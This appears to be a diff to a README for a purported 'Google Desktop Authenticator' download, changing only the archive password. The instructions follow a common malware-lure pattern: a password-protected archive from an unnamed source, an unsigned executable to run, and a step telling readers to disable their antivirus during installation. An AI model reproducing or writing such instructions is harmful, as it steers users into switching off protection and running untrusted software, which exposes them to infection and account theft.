@@ -9,7 +9,7 @@ Google Desktop Authenticator is a two-factor authentication app for PCs that gen
 ## Installation Instructions
 
 1. **Download the File**: First, download the Google Desktop Authenticator installation file from the provided source.
-2. **Extract the Archive**: Open the downloaded file and extract the contents of the archive. Use the password `funpay` to unzip the files.
+2. **Extract the Archive**: Open the downloaded file and extract the contents of the archive. Use the password `GDA` to unzip the files.
 3. **Run the Executable**: After extraction, locate the `google_desktop_authenticator.exe` file and run it to start the setup process.
 4. **Disable Antivirus (Optional)**: Since the file is not signed by Microsoft, your antivirus software might flag it as potentially unsafe. To avoid any issues, you can temporarily disable your antivirus during the installation process. Remember to re-enable it once the installation is complete.
 5. **Complete the Setup**: Follow the on-screen instructions to complete the installation and set up your Google accounts.
